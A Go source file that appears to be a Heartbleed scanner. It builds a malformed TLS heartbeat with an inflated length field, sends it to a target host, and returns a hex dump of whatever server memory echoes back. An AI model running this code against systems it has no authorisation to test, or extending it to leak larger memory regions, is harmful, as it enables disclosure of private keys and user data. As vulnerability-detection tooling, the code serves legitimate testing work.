package heartbleed

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"io"
	"net"
	"strings"
	"syscall"
	"time"

	"github.com/FiloSottile/Heartbleed/heartbleed/tls"
)

// Target struct holds host info
type Target struct {
	HostIP  string
	Service string
}

// ErrSafe message for Safe host
var ErrSafe = errors.New("heartbleed: no response or payload not found")

// ErrClosed message for Connection closed
var ErrClosed = errors.New("heartbleed: the site closed/reset the connection (usually a safe reaction to the heartbeat)")

// ErrTimeout message
var ErrTimeout = errors.New("heartbleed: timeout")

var padding = []byte(" YELLOW SUBMARINE ")

// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage(payload []byte, host string) []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+40+len(host)))
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(padding)
	if err != nil {
		panic(err)
	}
	_, err = buf.WriteString(host)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

// Heartbleed Vulnerability detection
func Heartbleed(tgt *Target, payload []byte, skIPVerify bool) (string, error) {
	host := tgt.HostIP
	if strings.Index(host, ":") == -1 {
		host = host + ":443"
	}

	netConn, err := net.DialTimeout("tcp", host, 3*time.Second)
	if err != nil {
		return "", err
	}
	netConn.SetDeadline(time.Now().Add(10 * time.Second))

	if tgt.Service != "https" {
		err = DoStartTLS(netConn, tgt.Service)
		if err != nil {
			return "", err
		}
	}

	hname := strings.Split(host, ":")
	conn := tls.Client(netConn, &tls.Config{InsecureSkipVerify: skIPVerify, ServerName: hname[0]})
	defer conn.Close()

	err = conn.Handshake()
	if err != nil {
		return "", err
	}

	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)))
	if err != nil {
		return "", err
	}

	res := make(chan error)
	closeNotifySent := false
	go func() {
		// Needed to process the incoming heartbeat
		_, err := conn.Read(nil)

		nerr, ok := err.(*net.OpError)
		if ok && nerr.Err != nil && nerr.Err.Error() == "unexpected message" {
			res <- ErrSafe
			return
		}

		if err == io.EOF || (err != nil && err.Error() == "EOF") ||
			(ok && nerr.Err == syscall.ECONNRESET) {
			if closeNotifySent && (err == io.EOF || err.Error() == "EOF") {
				// the connection terminated normally
				res <- ErrSafe
				return
			}
			// early on-heartbeat connection closures
			res <- ErrClosed
			return

		}

		res <- err
	}()

	go func() {
		// Check if the server is still alive
		time.Sleep(3 * time.Second)
		conn.SendCloseNotify()
		closeNotifySent = true
	}()

	select {
	case data := <-conn.Heartbeats:
		out := hex.Dump(data)
		if bytes.Index(data, padding) == -1 {
			return "", ErrSafe
		}
		if strings.Index(string(data), host) == -1 {
			return "", errors.New("Please try again")
		}

		// Vulnerable
		return out, nil

	case r := <-res:
		return "", r

	case <-time.After(8 * time.Second):
		return "", ErrTimeout
	}

}
